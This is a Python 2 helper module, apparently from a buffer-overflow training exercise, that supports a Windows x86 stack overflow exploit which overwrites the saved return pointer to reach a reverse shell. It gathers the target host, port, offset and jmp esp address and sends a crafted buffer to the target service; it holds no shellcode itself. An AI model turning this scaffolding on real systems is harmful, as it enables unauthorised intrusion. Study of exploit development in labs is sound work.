# Functions supporting a Windows x86 reverse shell stack buffer overflow
# Saved Return Pointer overwrite exploit.
# Parameters are saved in params.py for persistence.
# Delete params.py and params.pyc to reset them; or simply edit params.py
#
# Written by y0k3L
# Credit to Justin Steven and his 'dostackbufferoverflowgood' tutorial
# https://github.com/justinsteven/dostackbufferoverflowgood

import socket

# import params from params.py; or create an empty file if not exists
try:
    import params
except:
    open('params.py', 'a').close()
    print "params.py created for parameter persistence."

# return remote host (target) IP address
def getRhost():
    try:
        return params.RHOST
    except:
        RHOST = raw_input("RHOST: ")
        with open("params.py", "a") as f:
            f.write("RHOST = \"" + RHOST + "\"\n")
        return RHOST

# return remote host (target) port
def getRport():
    try:
        return params.RPORT
    except:
        RPORT = raw_input("RPORT: ")
        with open("params.py", "a") as f:
            f.write("RPORT = " + RPORT + "\n")
        return int(RPORT)

# return max buffer length
def getBufTotlen():
    try:
        return params.buf_totlen
    except:
        buf_totlen = raw_input("Max buffer length: ")
        with open("params.py", "a") as f:
            f.write("buf_totlen = " + buf_totlen + "\n")
        return int(buf_totlen)

# return Saved Return Pointer offset
def getOffsetSrp():
    try:
        return params.offset_srp
    except:
        offset_srp = raw_input("offset_srp: ")
        with open("params.py", "a") as f:
            f.write("offset_srp = " + offset_srp + "\n")
        return int(offset_srp)

# return pointer address to jmp esp
def getPtrJmpEsp():
    try:
        return params.ptr_jmp_esp
    except:
        ptr_jmp_esp = raw_input("ptr_jmp_esp: ")
        with open("params.py", "a") as f:
            f.write("ptr_jmp_esp = " + ptr_jmp_esp + "\n")
        return int(ptr_jmp_esp, 16)

# connect to remote host (target) and send buffer
# return 0 for success; return 1 for failure
def sendBuffer(RHOST, RPORT, buf):
    print "Attempting to connect to service..."

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((RHOST, RPORT))

        print "Sending buffer..."
        # this part may need to be modified depending on which command is vulnerable in the target service
        s.send(buf)
        s.close()

        print "Buffer sent."

        return 0

    except:
        print "Error connecting to service..."

        return 1
